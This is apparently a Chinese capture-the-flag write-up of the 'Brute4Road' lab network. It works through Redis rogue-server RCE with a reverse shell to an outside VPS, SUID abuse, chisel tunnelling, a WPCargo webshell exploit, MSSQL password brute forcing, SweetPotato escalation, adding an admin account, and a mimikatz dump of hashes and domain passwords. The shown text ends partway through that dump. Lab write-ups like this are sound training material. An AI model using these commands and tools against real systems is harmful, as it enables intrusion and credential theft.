# Brute4Road

:::info

Tags

- Redis - Redis 主从复制 RCE
- Brute Force - Mssql 密码爆破
- SMB - SMB 哈希传递
- Privilege Elevation - Linux Suid Privilege
- 域渗透 - 约束委派攻击

靶标介绍

> Brute4Road 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。

:::

```plaintext title="入口点"
39.98.113.15
```

## 入口点探测

使用 `fscan` 对入口点进行扫描

```shell
┌──(randark ㉿ kali)-[~]
└─$ ./tools/fscan-1.8.4/fscan -h 39.98.113.15
39.98.113.15:21 open
39.98.113.15:22 open
39.98.113.15:6379 open
39.98.113.15:80 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://39.98.113.15      code:200 len:4833   title:Welcome to CentOS
[+] ftp 39.98.113.15:21:anonymous
   [->]pub
[+] Redis 39.98.113.15:6379 unauthorized file:/usr/local/redis/db/dump.rdb
```

对 ftp 匿名登陆进行尝试，为空目录

尝试对 Redis 服务基于主从复制进行 RCE 利用

## 入口点 Redis 主从复制 RCE

使用 [n0b0dyCN/redis-rogue-server: Redis(< =5.0.5) RCE](https://github.com/n0b0dyCN/redis-rogue-server)

在 vps 上建立一个恶意服务器构建 Rsdis 主从复制 RCE 执行 Reverse Shell

```shell
root@jmt-projekt:~/redis-rogue-server# ./redis-rogue-server.py --rhost 39.98.113.15 --lhost 139.*.*.*
______         _ _      ______                         _____
| ___ \       | (_)     | ___ \                       /  ___|
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \'__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
                                     __/ |
                                    |___/
@copyright n0b0dy @ r3kapig

[info] TARGET 39.98.113.15:6379
[info] SERVER 139.*.*.*:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 139.*.*.*
Reverse server port: 9999
[info] Reverse shell payload sent.
[info] Check at 139.*.*.*:9999
[info] Unload module...
```

执行成功后收到反连 shell

```shell
root@jmt-projekt:~# pwncat-cs -lp 9999
[13:43:11] Welcome to pwncat 🐈!
[13:49:16] received connection from 39.98.113.15:53840
[13:49:17] 0.0.0.0:9999: normalizing shell path
[13:49:18] 39.98.113.15:53840: registered new host w/ db
(local) pwncat$ back
(remote) redis@centos-web01:/usr/local/redis/db$ whoami
redis
```

## 入口点 提权

发现 flag 文件 `/home/redis/flag/flag01`

```plaintext
-r-------- 1 root root 1.6K Jul 23 13:47 flag01
```

由于权限限制，需要提权到 root 用户才能读取 flag，尝试扫描 suid 特权文件并借此提权

```shell
(remote) redis@centos-web01:/home/redis/flag$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/unix_chkpwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/base64
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
(remote) redis@centos-web01:/home/redis/flag$ /usr/bin/base64 /home/redis/flag/flag01 | /usr/bin/base64 -d
 ██████                    ██              ██  ███████                           ██
░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██
░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██
░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████
░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██
░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██
░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████
░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░


flag01: flag{c9a177cc-f8c5-4077-91c6-c8d57609fc57}

Congratulations! ! !
Guess where is the second flag?
```

## flag - 01

```plaintext
 ██████                    ██              ██  ███████                           ██
░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██
░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██
░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████
░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██
░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██
░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████
░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░


flag01: flag{c9a177cc-f8c5-4077-91c6-c8d57609fc57}
```

## 入口点 内网扫描

鉴于使用 `pwncat-cs` 建立了立足点，传入 `fscan`

```shell
(remote) redis@centos-web01:/usr/local/redis/db$ cd /tmp
(remote) redis@centos-web01:/tmp$
(local) pwncat$ upload fscan_amd64.1
./fscan_amd64.1 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 6.2/6.2 MB • 111.9 kB/s • 0:00:00
[13:53:54] uploaded 6.22MiB in 52.66 seconds
(local) pwncat$ back
(remote) redis@centos-web01:/tmp$ chmod +x fscan_amd64.1
```

进行内网扫描

```plaintext
start ping
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.7      is alive
(icmp) Target 172.22.2.16     is alive
(icmp) Target 172.22.2.18     is alive
(icmp) Target 172.22.2.34     is alive
[*] Icmp alive hosts len is: 5
172.22.2.18:80 open
172.22.2.7:6379 open
172.22.2.34:445 open
172.22.2.16:1433 open
172.22.2.3:445 open
172.22.2.18:445 open
172.22.2.16:445 open
172.22.2.34:139 open
172.22.2.18:139 open
172.22.2.34:135 open
172.22.2.3:139 open
172.22.2.16:139 open
172.22.2.3:135 open
172.22.2.16:135 open
172.22.2.16:80 open
172.22.2.18:22 open
172.22.2.7:80 open
172.22.2.7:22 open
172.22.2.7:21 open
172.22.2.3:88 open
[*] alive ports len is: 20
start vulscan
[*] NetBios: 172.22.2.34     XIAORANG\CLIENT01
[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.2.18     WORKGROUP\UBUNTU-WEB02
[*] NetInfo:
[*]172.22.2.16
   [->]MSSQLSERVER
   [->]172.22.2.16
[*] WebTitle: http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
[*] NetInfo:
[*]172.22.2.3
   [->]DC
   [->]172.22.2.3
[*] NetInfo:
[*]172.22.2.34
   [->]CLIENT01
   [->]172.22.2.34
[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)
[*] WebTitle: http://172.22.2.16        code:404 len:315    title:Not Found
[*] NetBios: 172.22.2.3      [+]DC DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
[*] NetBios: 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
[+] ftp://172.22.2.7:21:anonymous
   [->]pub
[*] WebTitle: http://172.22.2.18        code:200 len:57738  title: 又一个 WordPress 站点
```

## 入口点 建立转发枢纽

使用 `chisel` 进行代理搭建，上传 `chisel` 之后，在入口点靶机建立 `chisel` 客户端转发内网

```shell title="vps"
root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
2024/07/23 14:00:40 server: Reverse tunnelling enabled
2024/07/23 14:00:40 server: Fingerprint ulX3QeMY7bHkUtrqjPTyx5ODV4RBSXZHv93CM6ZH9YQ=
2024/07/23 14:00:40 server: Listening on http://0.0.0.0:1337
```

```shell title="入口点靶机"
(remote) redis@centos-web01:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10001:socks
2024/07/23 14:01:12 client: Connecting to ws://139.*.*.*:1337
2024/07/23 14:01:12 client: Connected (Latency 44.864109ms)
```

成功建立 socks 代理

```shell title="vps"
root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
2024/07/23 14:00:40 server: Reverse tunnelling enabled
2024/07/23 14:00:40 server: Fingerprint ulX3QeMY7bHkUtrqjPTyx5ODV4RBSXZHv93CM6ZH9YQ=
2024/07/23 14:00:40 server: Listening on http://0.0.0.0:1337
2024/07/23 14:01:12 server: session#1: tun: proxy#R:10001=>socks: Listening
```

## 172.22.2.18 Wordpress

使用 `wpscan` 进行扫描

```shell
┌──(randark ㉿ kali)-[~/tools/chisel-v1.9.1]
└─$ wpscan --no-update --proxy socks5://139.*.*.*:10001 --url http://172.22.2.18/
[i] Plugin(s) Identified:

[+] wpcargo
 | Location: http://172.22.2.18/wp-content/plugins/wpcargo/
 | Last Updated: 2024-06-06T07:38:00.000Z
 | [!] The version is out of date, the latest version is 7.0.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 6.x.x (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt
```

查阅相关信息，发现 `wpcargo` 插件存在有未授权 RCE 漏洞 [biulove0x/CVE-2021-25003: WPCargo < 6.9.0 - Unauthenticated RCE](https://github.com/biulove0x/CVE-2021-25003)

上传 Webshell

```shell
┌──(env)(randark ㉿ kali)-[~/pocs/CVE-2021-25003]
└─$ proxychains4 python3 WpCargo.py -t http://172.22.2.18/
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17

############################################
# @author : biulove0x                      #
# @name   : WP Plugins WPCargo Exploiter   #
# @cve    : CVE-2021-25003                 #
############################################

[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.2.18:80  ...  OK
[-] http://172.22.2.18/wp-content/wp-conf.php => Uploaded!
```

尝试利用

```shell
┌──(env)(randark ㉿ kali)-[~/pocs/CVE-2021-25003]
└─$ proxychains4 http -f post "http://172.22.2.18/wp-content/wp-conf.php?1=system" "2=whoami" --output /tmp/output.txt; strings /tmp/output.txt
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.2.18:80  ...  OK
IHDR
PLTE
        pHYs
%IDAT
www-data
www-data
IEND
```

命令被成功执行，可以得知当前用户为 `www-data`

继续利用，尝试反弹 shell

:::warning

需要注意的是，内网环境没有出网，需要搭建本地转发，将入口机的端口转发给 vps，这样子才能在 vps 上接收到 `172.22.2.18` 的反弹 shell

具体路径为

`172.22.2.18` -- 反弹 shell--> ` 入口机 172.22.2.7` -- 端口转发 --> `vps pwncat-cs`

:::

```shell
root@jmt-projekt:~# pwncat-cs -lp 8888
[15:21:49] Welcome to pwncat 🐈!
[15:22:36] received connection from 127.0.0.1:51530
[15:22:37] localhost:51530: registered new host w/ db
(local) pwncat$ back
(remote) www-data@ubuntu-web02:/var/www/html/wp-content$ whoami
www-data
```

对 web 服务目录进行探测，发现异常

```plaintext
(remote) www-data@ubuntu-web02:/var/www/html$ ls -lh
total 216K
-rwxrwxrwx  1 root     root      405 Feb  6  2020 index.php
-rwxrwxrwx  1 root     root      20K Jan  1  2022 license.txt
-rwxrwxrwx  1 root     root     7.3K Mar 23  2022 readme.html
-rwxrwxrwx  1 root     root     7.0K Jan 21  2021 wp-activate.php
drwxrwxrwx  9 root     root     4.0K Jun  4  2022 wp-admin
-rwxrwxrwx  1 root     root      351 Feb  6  2020 wp-blog-header.php
-rwxrwxrwx  1 root     root     2.3K Nov 10  2021 wp-comments-post.php
-rwxrwxrwx  1 root     root     3.0K Dec 14  2021 wp-config-sample.php
-rwxrwxrwx  1 www-data www-data 3.3K Jun  9  2022 wp-config.php
drwxrwxrwx  6 root     root     4.0K Jul 23 14:49 wp-content
-rwxrwxrwx  1 root     root     3.9K Apr 28  2022 wp-cron.php
drwxrwxrwx 26 root     root      12K Jun  4  2022 wp-includes
-rwxrwxrwx  1 root     root     2.5K Mar 20  2022 wp-links-opml.php
-rwxrwxrwx  1 root     root     3.9K Apr 12  2022 wp-load.php
-rwxrwxrwx  1 root     root      48K Apr 29  2022 wp-login.php
-rwxrwxrwx  1 root     root     8.4K Mar 23  2022 wp-mail.php
-rwxrwxrwx  1 root     root      24K Apr 12  2022 wp-settings.php
-rwxrwxrwx  1 root     root      32K Apr 11  2022 wp-signup.php
-rwxrwxrwx  1 root     root     4.7K Apr 11  2022 wp-trackback.php
-rwxrwxrwx  1 root     root     3.2K Jun  9  2020 xmlrpc.php
```

发现其中 `wp-config.php` 文件的所有权为 `www-data` 用户，很明显是要读取其中的配置

```php title="wp-config.php"
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** Database username */
define('DB_USER', 'wpuser');

/** Database password */
define('DB_PASSWORD', 'WpuserEha8Fgj9');

/** Database hostname */
define('DB_HOST', '127.0.0.1');
```

尝试连接数据库

```shell
(remote) www-data@ubuntu-web02:/var/www/html$ mysql -u wpuser -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 84
Server version: 8.0.29-0ubuntu0.20.04.3 (Ubuntu)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| f1aagggghere       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+

mysql> show tables;
+--------------------------------+
| Tables_in_f1aagggghere         |
+--------------------------------+
| S0meth1ng_y0u_m1ght_1ntereSted |
| flag02                         |
+--------------------------------+

mysql> select * from flag02;
+------+--------------------------------------------+
| id   | flag02                                     |
+------+--------------------------------------------+
|    1 | flag{c757e423-eb44-459c-9c63-7625009910d8} |
+------+--------------------------------------------+

mysql> select * from S0meth1ng_y0u_m1ght_1ntereSted;
+-----+-----------+
| id  | pAssw0rd  |
+-----+-----------+
|   1 |  xDR6icFo |
|   2 |  lg4u3WsB |
|   3 |  6PoGQ2OZ |
|   4 |  2aq5dPNU |
|   5 |  S3DUMegA |
|   6 |  w9eXGrxa |
......
```

暂时不确定 `S0meth1ng_y0u_m1ght_1ntereSted` 表中信息的意义，可能是密码表，将其中的字符串提取出来另存为 `pwd-dbs.txt`

## flag - 02

```plaintext
flag{c757e423-eb44-459c-9c63-7625009910d8}
```

## 172.22.2.16 MSSQLSERVER 爆破 + 提权

使用上面得到的密码，对 mssql 进行爆破

```shell
┌──(randark ㉿ kali)-[~/tmp/Yunjing-Brute4Road]
└─$ proxychains4 -q hydra -l sa -P pwd-dbs.txt mssql://172.22.2.16
[DATA] attacking mssql://172.22.2.16:1433/
[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC
```

建立将 `172.22.2.16:1443(mssql)` -> `vps:1003` 的代理

```shell title="入口机"
(remote) redis@centos-web01:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:10003:172.22.2.16:1433
2024/07/23 16:10:31 client: Connecting to ws://139.*.*.*:1337
2024/07/23 16:10:31 client: Connected (Latency 44.571643ms)
```

得到密码之后，尝试利用 [SafeGroceryStore/MDUT: MDUT - Multiple Database Utilization Tools](https://github.com/SafeGroceryStore/MDUT) 进行连接

![img](img/image_20240714-161423.png)

成功连接

![img](img/image_20240714-161440.png)

通过 whoami 的执行结果 `nt service\mssqlserver` 可以想到，使用 [CCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019](https://github.com/CCob/SweetPotato) 进行提权

激活 `Ole` 组件之后，上传 `SweetPotato.exe` 至 `C:/Users/Public/Downloads/` 之后，尝试执行

```shell
> C:/Users/Public/Downloads/SweetPotato.exe -a "whoami"

Modifying SweetPotato by Uknow to support webshell
Github: https://github.com/uknowsec/SweetPotato
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
[+] Triggering notification on evil PIPE \\MSSQLSERVER/pipe/3cf7741c-0c88-4fff-977a-69c781630210
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] CreatePipe success
[+] Command : "c:\Windows\System32\cmd.exe" /c whoami
[+] process with pid: 4444 created.

=====================================

nt authority\system


[+] Process created, enjoy!
```

意味着可以依靠 `SweetPotato` 直接提权到 `nt authority\system`

借此，直接创建用户

```shell
net user randark admin123 /add
net localgroup administrators randark /add
```

然后使用 RDP 登录到 `172.22.2.16`

![img](img/image_20240739-163908.png)

同时找到 flag

![img](img/image_20240739-163944.png)

## flag - 03

```plaintext
8""""8                           88     8"""8
8    8   eeeee  e   e eeeee eeee 88     8   8  eeeee eeeee eeeee
8eeee8ee 8   8  8   8   8   8    88  88 8eee8e 8  88 8   8 8   8
88     8 8eee8e 8e  8   8e  8eee 88ee88 88   8 8   8 8eee8 8e  8
88     8 88   8 88  8   88  88       88 88   8 8   8 88  8 88  8
88eeeee8 88   8 88ee8   88  88ee     88 88   8 8eee8 88  8 88ee8


flag03: flag{4dccd425-6395-49ed-9c1e-47d73f9c8623}
```

## 172.22.2.16 MSSQLSERVER 抓取域内信息

由于没有安全措施，所以可以直接上传 `mimikatz`

```shell
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # privilege::debug
Privilege '20' OK
```

<details>

<summary> mimikatz # sekurlsa::logonpasswords </summary>

```shell
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 6718750 (00000000:0066851e)
Session           : RemoteInteractive from 2
User Name         : randark
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 16:38:37
SID               : S-1-5-21-1403470932-1755135066-2609122076-1027
    msv :
     [00000003] Primary
     * Username : randark
     * Domain   : MSSQLSERVER
     * NTLM     : 3008c87294511142799dca1191e69a0f
     * SHA1     : b7bc3a1b04d9e165c6762b0a1cde5226df5b6a6a
    tspkg :
    wdigest :
     * Username : randark
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : randark
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 6686789 (00000000:00660845)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/7/23 16:38:37
SID               : S-1-5-90-0-2
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 6686749 (00000000:0066081d)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2024/7/23 16:38:37
SID               : S-1-5-90-0-2
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * NTLM     : 302393922f8920b52b9724a8e3d735bb
     * SHA1     : 4bf600cf8f039a3685b643424c0626296e4977e6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER$
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER$
     * Domain   : xiaorang.lab
     * Password : 9a 7a 2c ef 2f c9 f3 36 b7 f3 8f 95 a5 99 2e 7e 64 55 8c bc 6d 74 a5 24 39 76 e8 7e 83 6d 52 77 cf 6f 1c 52 07 6e 5f de cb 48 69 a7 49 33 ab b2 fe 3e a5 48 f3 49 26 2d 59 1f 7a 37 8c 72 85 3c b7 16 85 ef dc 3c 6f 09 fd 9a fc ae 77 00 4b 9b 2e 91 0c 08 88 40 d6 13 0f e6 fb 66 b7 6d d9 7e 04 84 b0 d9 66 6c 35 7b 2f 16 63 e6 61 12 da 01 e8 05 c5 5b 53 b2 c4 cf 60 71 6d b1 77 7f a6 99 c1 e5 3d 3a a7 b6 4f 74 0f a0 ad 9c 48 1b c3 14 5d 0a dc ce c3 df 3d ee 5e 4b 40 7a 07 24 52 6c 7b 5c f8 c0 2f eb 35 77 d2 01 c1 55 82 f1 ba 8c f4 00 e8 7f 42 30 b0 78 98 bb bd 9e 6d 48 7d bb 7b 9e 23 cf eb 7c 3e 01 b5 fd 50 f5 a9 4c ca bb 05 93 41 ef 0a 7d b3 09 ef e6 9c e5 19 1a 29 8b 88 1e 9b 6f f0 42 8e 71 86 67 28 a2 a2 90 d5 93
    ssp :
    credman :

Authentication Id : 0 ; 283454 (00000000:0004533e)
Session           : Interactive from 1
User Name         : William
Domain            : XIAORANG
Logon Server      : DC
Logon Time        : 2024/7/23 13:48:33
SID               : S-1-5-21-2704639352-1689326099-2164665914-1106
    msv :
     [00000003] Primary
     * Username : William
     * Domain   : XIAORANG
     * NTLM     : 8853911fd59e8d0a82176e085a2157de
     * SHA1     : e4fd18cfd47b9a77836c82283fb560e6f465bc40
     * DPAPI    : da3fc187c1ff105853ec62c10cddd26b
    tspkg :
    wdigest :
     * Username : William
     * Domain   : XIAORANG
     * Password : (null)
    kerberos :
     * Username : William
     * Domain   : XIAORANG.LAB
     * Password : Willg1UoO6Jt
    ssp :
    credman :

Authentication Id : 0 ; 230446 (00000000:0003842e)
Session           : Interactive from 0
User Name         : MSSQLSERVER20
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1023
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER20
     * Domain   : MSSQLSERVER
     * NTLM     : f5c512b9cb3052c5ad35e526d44ba85a
     * SHA1     : b09c8d9463c494d36e1a4656c15af8e1a7e4568f
    tspkg :
    wdigest :
     * Username : MSSQLSERVER20
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER20
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229906 (00000000:00038212)
Session           : Interactive from 0
User Name         : MSSQLSERVER16
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1019
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER16
     * Domain   : MSSQLSERVER
     * NTLM     : 42c0eed1872923f6b60118d9711282a6
     * SHA1     : dcf14b63c01e9d5a9d4d9c25d1b2eb6c65c2e3a6
    tspkg :
    wdigest :
     * Username : MSSQLSERVER16
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER16
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229741 (00000000:0003816d)
Session           : Interactive from 0
User Name         : MSSQLSERVER14
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1017
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER14
     * Domain   : MSSQLSERVER
     * NTLM     : 7c8553b614055d945f8b8c3cf8eae789
     * SHA1     : 1efdc2efed20ca503bdefea5aef8aa0ea04c257b
    tspkg :
    wdigest :
     * Username : MSSQLSERVER14
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER14
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 229171 (00000000:00037f33)
Session           : Interactive from 0
User Name         : MSSQLSERVER09
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1012
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER09
     * Domain   : MSSQLSERVER
     * NTLM     : 2dd7fe93426175a9ff3fa928bcf0eb77
     * SHA1     : a34c0482568fc9329f33ccdc1852fab9ef65bcd1
    tspkg :
    wdigest :
     * Username : MSSQLSERVER09
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER09
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 228926 (00000000:00037e3e)
Session           : Interactive from 0
User Name         : MSSQLSERVER06
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1009
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER06
     * Domain   : MSSQLSERVER
     * NTLM     : aa206c617e2194dd76b766b7e3c92bc6
     * SHA1     : 62dd8046a71c17fe7263bab86b1ca4506f8c373c
    tspkg :
    wdigest :
     * Username : MSSQLSERVER06
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER06
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 228845 (00000000:00037ded)
Session           : Interactive from 0
User Name         : MSSQLSERVER05
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1008
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER05
     * Domain   : MSSQLSERVER
     * NTLM     : b552da4a7f732c40ca73c01dfaea7ebc
     * SHA1     : 7f041a31e763eed45fb881c7f77831b888c3051d
    tspkg :
    wdigest :
     * Username : MSSQLSERVER05
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER05
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 228763 (00000000:00037d9b)
Session           : Interactive from 0
User Name         : MSSQLSERVER04
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1007
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER04
     * Domain   : MSSQLSERVER
     * NTLM     : 36bd3cceea3d413e8111b0bef32da84d
     * SHA1     : 414d2c783a3fb2ba855e41c243c583bb0604fe02
    tspkg :
    wdigest :
     * Username : MSSQLSERVER04
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER04
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

Authentication Id : 0 ; 228681 (00000000:00037d49)
Session           : Interactive from 0
User Name         : MSSQLSERVER03
Domain            : MSSQLSERVER
Logon Server      : MSSQLSERVER
Logon Time        : 2024/7/23 13:48:29
SID               : S-1-5-21-1403470932-1755135066-2609122076-1006
    msv :
     [00000003] Primary
     * Username : MSSQLSERVER03
     * Domain   : MSSQLSERVER
     * NTLM     : 2f7c88f56a7236f476d18ea6b5a2d33a
     * SHA1     : 5bc2d09b8b0f7c11a1fc3fb2f97b713ac116b6eb
    tspkg :
    wdigest :
     * Username : MSSQLSERVER03
     * Domain   : MSSQLSERVER
     * Password : (null)
    kerberos :
     * Username : MSSQLSERVER03
     * Domain   : MSSQLSERVER
     * Password : (null)
    ssp :
    credman :

